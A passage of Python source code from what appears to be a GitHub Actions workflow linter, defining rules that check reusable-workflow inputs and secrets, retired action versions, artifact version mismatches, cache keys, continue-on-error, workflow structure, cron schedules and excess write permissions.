        for n in ro.strings():
            if n.text in LATEST_LABELS:
                yield Hit(n.line, f"`{n.text}` is an alias GitHub re-points to a newer OS image, which can break "
                          "builds with no change on your side",
                          f"Pin the image, e.g. `runs-on: {LATEST_LABELS[n.text]}`, and bump it deliberately.")


# ---------------------------------------------------------------------------------------------------------
# GHA1022 reusable workflow contract


def _required(d: Node) -> bool:
    r = d.get("required")
    return r is not None and r.is_true()


@rule("GHA1022", "error", "call does not match the reusable workflow's inputs/secrets")
def r_reusable(ctx: Ctx) -> Iterable[Hit]:
    for j in ctx.doc.jobs:
        if not j.uses or not j.uses.startswith("./"):
            continue
        path = j.uses[2:]
        if ctx.loader is None:
            continue
        callee = ctx.loader(path)
        if callee is None:
            yield Hit(j.uses_node.line if j.uses_node else j.line, f"`{j.uses}` does not exist or cannot be read in this repository",
                      "Fix the path (relative to the repository root, e.g. ./.github/workflows/build.yml).")
            continue
        if callee.error is not None or callee.kind != "workflow":
            continue
        if "workflow_call" not in callee.events:
            yield Hit(j.uses_node.line if j.uses_node else j.line,
                      f"`{j.uses}` has no `workflow_call` trigger, so it cannot be called",
                      "Add `on: {workflow_call: {}}` to the callee.")
            continue
        wc = callee.events["workflow_call"]
        declared_in = wc.get("inputs") if wc is not None else None
        declared_sec = wc.get("secrets") if wc is not None else None
        din = declared_in.items if declared_in is not None and declared_in.is_map else {}
        dsec = declared_sec.items if declared_sec is not None and declared_sec.is_map else {}
        w = j.node.get("with")
        passed = w.items if w is not None and w.is_map else {}
        for k, v in passed.items():
            if k not in din:
                sg = suggest(k, list(din), 0.6)
                yield Hit(v.key_line, f"input `{k}` is not declared by `{path}`" + (
                    f" (did you mean `{sg}`?)" if sg else ""),
                    "Declare it under `on.workflow_call.inputs` in the callee or remove it from `with:`.")
        for k, d in din.items():
            if _required(d) and d.get("default") is None and k not in passed:
                yield Hit(j.line, f"required input `{k}` of `{path}` is not passed",
                          f"Add `with: {{{k}: <value>}}` to this job.")
        s = j.node.get("secrets")
        inherit = s is not None and s.is_scalar and s.text.strip() == "inherit"
        sp = s.items if s is not None and s.is_map else {}
        for k, v in sp.items():
            if k not in dsec and not inherit:
                yield Hit(v.key_line, f"secret `{k}` is not declared by `{path}`",
                          "Declare it under `on.workflow_call.secrets` in the callee or remove it.")
        if not inherit:
            for k, d in dsec.items():
                if _required(d) and k not in sp:
                    yield Hit(j.line, f"required secret `{k}` of `{path}` is not passed",
                              f"Add `secrets: {{{k}: ${{{{ secrets.{k} }}}}}}`.")


# ---------------------------------------------------------------------------------------------------------
# GHA1023 / GHA1024 retired actions


def action_major(step_uses: str, line_text: str) -> int | None:
    """Major version from `@vN` or, for SHA pins, from a trailing `# vN.M.K` comment."""
    if "@" not in step_uses:
        return None
    ref = step_uses.rsplit("@", 1)[1]
    m = re.match(r"v?(\d+)", ref)
    if m and not _SHA.match(ref):
        return int(m.group(1))
    c = re.search(r"#\s*v?(\d+)", line_text)
    return int(c.group(1)) if c else None


@rule("GHA1023", "warning", "retired or deprecated action version")
def r_retired(ctx: Ctx) -> Iterable[Hit]:
    from .tables import RETIRED_AS_OF
    for _job, step in ctx.doc.all_steps():
        if not step.uses or step.uses_node is None:
            continue
        low = step.action_path()
        base = step.action() or ""
        for key in (low, base):
            if key in ARCHIVED_ACTIONS:
                yield Hit(step.uses_node.line, f"`{key}` is {ARCHIVED_ACTIONS[key]}",
                          "Replace it with the maintained alternative.", "warning")
                break
        key = low if low in RETIRED_ACTIONS else base
        if key in RETIRED_ACTIONS:
            maxmajor, sev, why = RETIRED_ACTIONS[key]
            major = action_major(step.uses, ctx.doc.line_text(step.uses_node.line))
            if major is not None and major <= maxmajor:
                yield Hit(step.uses_node.line, f"`{step.uses}`: {why}",
                          f"Upgrade to v{maxmajor + 1} or later (pin its SHA). Table as of {RETIRED_AS_OF}.", sev)


@rule("GHA1024", "error", "upload-artifact and download-artifact majors are incompatible")
def r_artifacts(ctx: Ctx) -> Iterable[Hit]:
    ups: list[tuple[int, int]] = []
    downs: list[tuple[int, int]] = []
    for _job, step in ctx.doc.all_steps():
        if step.uses_node is None or not step.uses:
            continue
        a = step.action()
        if a not in ("actions/upload-artifact", "actions/download-artifact"):
            continue
        major = action_major(step.uses, ctx.doc.line_text(step.uses_node.line))
        if major is None:
            continue
        (ups if a == "actions/upload-artifact" else downs).append((step.uses_node.line, major))
    old_up = [x for x in ups if x[1] < 4]
    new_up = [x for x in ups if x[1] >= 4]
    old_down = [x for x in downs if x[1] < 4]
    new_down = [x for x in downs if x[1] >= 4]
    pairs = []
    if old_up and new_down:
        pairs.append((old_up[0], new_down[0], old_up[0][0]))
    if new_up and old_down:
        pairs.append((new_up[0], old_down[0], old_down[0][0]))
    for (ul, um), (dl, dm), old_line in pairs:
        yield Hit(old_line, f"artifact actions use different backends: upload-artifact v{um} (line {ul}) "
                  f"and download-artifact v{dm} (line {dl}); v3 and v4 cannot read each other's artifacts",
                  "Use v4 or newer of both.")
        return


# ---------------------------------------------------------------------------------------------------------
# GHA1025 cache key, GHA1026 continue-on-error


@rule("GHA1025", "warning", "cache key has no content hash")
def r_cache_key(ctx: Ctx) -> Iterable[Hit]:
    for _job, step in ctx.doc.all_steps():
        if step.action_path() not in ("actions/cache", "actions/cache/restore", "actions/cache/save"):
            continue
        key = step.with_get("key")
        if key is None or key.string() is None:
            continue
        if "hashfiles(" not in key.text.lower() and "github.sha" not in key.text.lower():
            yield Hit(key.line, f"cache key `{key.text.strip()}` never changes, so the cache is never refreshed "
                      "when dependencies change",
                      "Include a hash of the lockfile: `key: ${{ runner.os }}-pip-${{ hashFiles('**/requirements*.txt') }}`.",
                      None, step.line)


@rule("GHA1026", "warning", "continue-on-error hides failures")
def r_continue(ctx: Ctx) -> Iterable[Hit]:
    for j in ctx.doc.jobs:
        c = j.node.get("continue-on-error")
        if c is not None and c.is_scalar and c.is_true():
            yield Hit(c.key_line, f"job `{j.id}` can fail without failing the workflow, so a broken build looks "
                      "green", "Remove it; if it is an experimental matrix leg, scope it: "
                      "`continue-on-error: ${{ matrix.experimental }}`.")
    for _j, s in ctx.doc.all_steps():
        c = s.node.get("continue-on-error")
        if c is not None and c.is_scalar and c.is_true():
            yield Hit(c.key_line, "this step's failure is ignored", "Remove it, or handle the expected failure in "
                      "the script (`|| true` on exactly the command that may fail).", "info", s.line)


# ---------------------------------------------------------------------------------------------------------
# GHA1027 structure, GHA1033 duplicates


@rule("GHA1027", "error", "workflow structure problem")
def r_structure(ctx: Ctx) -> Iterable[Hit]:
    doc = ctx.doc
    root = doc.root
    if root is None:
        return
    if doc.kind == "action":
        runs = root.get("runs")
        if runs is None or not runs.is_map:
            yield Hit(root.line, "an action file needs a `runs:` mapping", "Add `runs: {using: composite}`.")
        elif runs.get("using") is None:
            yield Hit(runs.key_line, "`runs.using` is missing", "Set `using: composite` (or node20, docker).")
        elif (runs.get("using") or Node("scalar", 0, 0, 0)).text == "composite" and runs.get("steps") is None:
            yield Hit(runs.key_line, "a composite action needs `runs.steps`", "Add a `steps:` list.")
        return
    for k, v in root.items.items():
        if k not in WORKFLOW_KEYS:
            sg = suggest(k, WORKFLOW_KEYS, 0.6)
            yield Hit(v.key_line, f"unknown top-level key `{k}`" + (f" (did you mean `{sg}`?)" if sg else ""),
                      "Valid keys: " + ", ".join(WORKFLOW_KEYS) + ".")
    if root.get("on") is None:
        yield Hit(root.line, "the workflow has no `on:` trigger, so it never runs", "Add `on: {push: {}}`.")
    for ev, evn in doc.events.items():
        if ev not in EVENTS:
            sg = suggest(ev, EVENTS, 0.6)
            line = (evn.key_line if evn is not None else (doc.on_node.line if doc.on_node else root.line))
            if doc.on_node is not None and doc.on_node.is_seq:
                line = next((n.line for n in doc.on_node.seq if n.is_scalar and n.text == ev), line)
            yield Hit(line, f"unknown event `{ev}`" + (f" (did you mean `{sg}`?)" if sg else ""),
                      "See the 'Events that trigger workflows' documentation for valid names.")
    if doc.jobs_node is None:
        yield Hit(root.line, "the workflow has no `jobs:`", "Add a `jobs:` mapping with at least one job.")
        return
    if not doc.jobs_node.is_map:
        yield Hit(doc.jobs_node.key_line, "`jobs:` must be a mapping of job ids", "Use `jobs: {build: {runs-on: ubuntu-24.04, steps: [...]}}`.")
        return
    perm_nodes = [("workflow", root.get("permissions"))] + [(f"job {j.id}", j.permissions) for j in doc.jobs]
    for who, pn in perm_nodes:
        if pn is not None and pn.is_map:
            for k, v in pn.items.items():
                if k not in PERMISSION_SCOPES:
                    sg = suggest(k, PERMISSION_SCOPES, 0.6)
                    yield Hit(v.key_line, f"{who}: unknown permission scope `{k}`" + (
                        f" (did you mean `{sg}`?)" if sg else ""), "Scopes: " + ", ".join(PERMISSION_SCOPES) + ".")
                elif v.text not in ("read", "write", "none"):
                    yield Hit(v.line, f"{who}: `{k}: {v.text}` must be read, write or none",
                              "Use one of read, write, none.")
    for j in doc.jobs:
        for k, v in j.node.items.items():
            if k not in JOB_KEYS:
                sg = suggest(k, JOB_KEYS, 0.6)
                yield Hit(v.key_line, f"job `{j.id}`: unknown key `{k}`" + (f" (did you mean `{sg}`?)" if sg else ""),
                          "Valid job keys: " + ", ".join(JOB_KEYS) + ".")
        if j.uses is None and j.runs_on is None:
            yield Hit(j.line, f"job `{j.id}` has no `runs-on`", "Add `runs-on: ubuntu-24.04`.")
        if j.uses is not None and j.node.get("steps") is not None:
            yield Hit(j.line, f"job `{j.id}` has both `uses` and `steps`", "A job either calls a workflow or has steps.")
        if j.uses is None and j.node.get("steps") is None:
            yield Hit(j.line, f"job `{j.id}` has no `steps`", "Add a `steps:` list.")
        st = j.node.get("steps")
        if st is not None and not st.is_seq:
            yield Hit(st.key_line, f"job `{j.id}`: `steps` must be a list", "Use `- run: ...` items.")
    for _j, s in doc.all_steps():
        for k, v in s.node.items.items():
            if k not in STEP_KEYS:
                sg = suggest(k, STEP_KEYS, 0.6)
                yield Hit(v.key_line, f"unknown step key `{k}`" + (f" (did you mean `{sg}`?)" if sg else ""),
                          "Valid step keys: " + ", ".join(STEP_KEYS) + ".")
        has_run, has_uses = s.run_node is not None, s.uses_node is not None
        if has_run and has_uses:
            yield Hit(s.line, "step has both `run` and `uses`", "A step does one or the other.")
        elif not has_run and not has_uses:
            yield Hit(s.line, "step has neither `run` nor `uses`", "Add `run: <command>` or `uses: <action>`.")


@rule("GHA1033", "error", "duplicate mapping key")
def r_dups(ctx: Ctx) -> Iterable[Hit]:
    for key, line in ctx.doc.dups:
        yield Hit(line, f"key `{key}` appears twice in the same mapping; GitHub rejects the file",
                  "Merge the two entries or rename one.")


# ---------------------------------------------------------------------------------------------------------
# GHA1028 YAML float versions


@rule("GHA1028", "warning", "unquoted version number loses its trailing zero")
def r_float_version(ctx: Ctx) -> Iterable[Hit]:
    doc = ctx.doc
    if doc.root is None:
        return
    cands: list[tuple[str, Node]] = []
    for _j, s in doc.all_steps():
        if s.with_ is not None and s.with_.is_map:
            for k, v in s.with_.items.items():
                if k.endswith("version") and v.is_scalar:
                    cands.append((k, v))
    for j in doc.jobs:
        m = j.strategy.get("matrix") if j.strategy else None
        if m is not None:
            for k, v in walk_scalars(m):
                cands.append((k, v))
    for key, v in cands:
        if v.style == "" and isinstance(v.value, float) and re.search(r"\.\d*0\Z", v.text):
            yield Hit(v.line, f"`{key}: {v.text}` is parsed as the number {v.value:g}, so the action receives "
                      f"`{v.value:g}`, not `{v.text}` (the classic Python 3.10 -> 3.1)",
                      f"Quote it: `\"{v.text}\"`.")


# ---------------------------------------------------------------------------------------------------------
# GHA1029 / GHA1030 cron


def _crons(ctx: Ctx) -> Iterator[Node]:
    sched = ctx.events.get("schedule")
    if sched is not None and sched.is_seq:
        for item in sched.seq:
            c = item.get("cron") if item.is_map else None
            if c is not None and c.is_scalar:
                yield c


@rule("GHA1029", "error", "invalid cron expression in `schedule`")
def r_cron_invalid(ctx: Ctx) -> Iterable[Hit]:
    for c in _crons(ctx):
        try:
            cronmod.parse_cron(c.text)
        except cronmod.CronError as e:
            yield Hit(c.line, f"cron `{c.text}` is invalid: {e}", "Use five fields: minute hour day-of-month month "
                      "day-of-week (UTC), e.g. `17 3 * * 1`.")


@rule("GHA1030", "info", "schedule at the top of the hour or more often than every 5 minutes")
def r_cron_busy(ctx: Ctx) -> Iterable[Hit]:
    for c in _crons(ctx):
        try:
            cr = cronmod.parse_cron(c.text)
        except cronmod.CronError:
            continue
        for note in cronmod.congestion_notes(cr, ctx.now):
            yield Hit(c.line, f"cron `{c.text}`: {note}", "Choose a quiet minute, e.g. `17 3 * * *`.")


# ---------------------------------------------------------------------------------------------------------
# GHA1031 composite shell


@rule("GHA1031", "error", "composite action `run:` step without `shell:`")
def r_composite_shell(ctx: Ctx) -> Iterable[Hit]:
    if ctx.doc.kind != "action":
        return
    for s in ctx.doc.steps:
        if s.run_node is not None and s.node.get("shell") is None:
            yield Hit(s.line, "steps with `run:` in a composite action must set `shell:`",
                      "Add `shell: bash`.")


# ---------------------------------------------------------------------------------------------------------
# GHA1032 write permission without evidence


@rule("GHA1032", "info", "job is granted write access it does not appear to use")
def r_unused_write(ctx: Ctx) -> Iterable[Hit]:
    doc = ctx.doc
    for j in doc.jobs:
        if not j.steps:
            continue
        eff, _src = effective(doc, j)
        if not eff:
            continue
        needs = infer_needs(j, doc)
        if not needs.conclusive:
            continue
        extra = sorted(s for s, lv in eff.items() if lv == "write" and needs.scopes.get(s) != "write")
        if extra:
            node = j.permissions or doc.get("permissions")
            yield Hit(node.key_line if node else j.line,
                      f"job `{j.id}` is granted write on {', '.join(extra)} but its steps (all recognised) only need "
                      "read",
                      "Downgrade to `read` or remove the scope (see permissions_review for a suggestion).")
